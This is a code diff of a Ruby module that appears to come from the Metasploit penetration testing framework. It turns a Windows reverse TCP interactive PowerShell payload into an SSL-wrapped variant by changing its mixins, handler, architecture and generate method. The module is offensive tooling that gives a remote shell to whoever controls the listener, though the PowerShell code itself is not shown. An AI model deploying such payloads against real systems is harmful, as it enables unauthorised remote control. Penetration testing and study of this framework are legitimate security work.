@@ -7,16 +7,16 @@ require 'rex/powershell'
 module MetasploitModule
   CachedSize = :dynamic
 
-  include Msf::Payload::Windows::Exec
-  include Msf::Payload::Windows::Powershell
+  include Msf::Payload::Single
   include Rex::Powershell::Command
+  include Msf::Payload::Windows::Powershell
 
   def initialize(info = {})
     super(
-      update_info(
+      merge_info(
         info,
-        'Name' => 'Windows Interactive Powershell Session, Reverse TCP',
-        'Description' => 'Listen for a connection and spawn an interactive powershell session',
+        'Name' => 'Windows Interactive Powershell Session, Reverse TCP SSL',
+        'Description' => 'Interacts with a powershell session on an established SSL socket connection',
         'Author' => [
           'Ben Turner', # benpturner
           'Dave Hardy' # davehardy20
@@ -25,18 +25,20 @@ module MetasploitModule
           ['URL', 'https://blog.nettitude.com/uk/interactive-powershell-session-via-metasploit/']
         ],
         'License' => MSF_LICENSE,
-        'Platform' => 'win',
-        'Arch' => ARCH_X86,
-        'Handler' => Msf::Handler::ReverseTcp,
-        'Session' => Msf::Sessions::PowerShell
+        'Platform' => 'windows',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcpSsl,
+        'Session' => Msf::Sessions::PowerShell,
+        'RequiredCmd' => 'generic',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
       )
     )
   end
 
-  #
-  # Override the exec command string
-  #
-  def powershell_command
-    generate_powershell_code('Reverse')
+  def generate
+    generate_powershell_code('SSL')
   end
 end
